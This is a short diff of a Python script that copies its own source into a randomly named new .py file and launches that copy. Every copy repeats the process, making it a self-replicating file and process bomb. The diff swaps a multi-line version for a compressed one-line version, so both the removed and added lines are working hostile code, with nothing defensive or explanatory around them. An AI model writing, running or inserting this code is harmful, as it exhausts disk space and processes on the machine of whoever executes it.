@@ -1,7 +1,1 @@
-import os; import string; import random; from subprocess import call
-def create_string(): return "".join([random.choice(string.ascii_letters) for x in range(random.randint(5, 20))])
-with open(__file__, 'r') as file: data = file.read(); filename = f"{create_string()}.py"
-with open(filename, 'x') as file:
-    with open(filename, 'w') as file2:
-        file2.write(data)
-call(["python", filename])
+import os; import string; import random; from subprocess import call; create_string = (lambda: "".join([random.choice(string.ascii_letters) for x in range(random.randint(5, 20))])); file = open(__file__, 'r'); data = file.read(); filename = f"{create_string()}.py"; file = open(filename, 'x'); file.close(); file = open(filename, 'w'); file.write(data); file.close(); call(["python", filename])
